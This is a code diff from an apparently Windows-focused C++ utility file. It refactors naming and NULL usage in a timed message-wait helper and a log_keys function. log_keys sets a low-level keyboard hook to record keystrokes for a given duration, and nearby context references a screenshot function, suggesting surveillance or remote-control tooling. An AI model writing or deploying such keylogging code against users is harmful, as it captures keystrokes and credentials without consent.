@@ -118,28 +118,28 @@ std::string win_utils::take_screenshot()
     return bmp_buffer;
 }
 
-BOOL win_utils::GetMessageWithTimeout(MSG* msg, UINT to)
+BOOL win_utils::get_message_with_timeout(MSG* msg, unsigned int to)
 {
     BOOL res;
-    UINT_PTR timerId = SetTimer(NULL, NULL, to, NULL);
-    res = GetMessage(msg, NULL, NULL, NULL);
-    KillTimer(NULL, timerId);
+    UINT_PTR timer_id = SetTimer(nullptr, 0, to, nullptr);
+    res = GetMessage(msg, nullptr, 0, 0);
+    KillTimer(nullptr, timer_id);
     if (!res)
         return FALSE;
-    if (msg->message == WM_TIMER && msg->hwnd == NULL && msg->wParam == timerId)
+    if (msg->message == WM_TIMER && msg->hwnd == nullptr && msg->wParam == timer_id)
         return FALSE;
     return TRUE;
 }
 
-std::string win_utils::log_keys(size_t duration_seconds)
+std::string win_utils::log_keys(unsigned int duration_seconds)
 {
     key_logger_key_codes.clear();
-    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, win_utils::log_keys_hook, 0, 0);
+    HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, win_utils::log_keys_hook, 0, 0);
 
     MSG msg;
-    GetMessageWithTimeout(&msg, duration_seconds * 1000);
+    get_message_with_timeout(&msg, duration_seconds * 1000);
 
-    UnhookWindowsHookEx(hhkLowLevelKybd);
+    UnhookWindowsHookEx(hook_handle);
 
     std::string result = "";
     for (const DWORD val : key_logger_key_codes) {
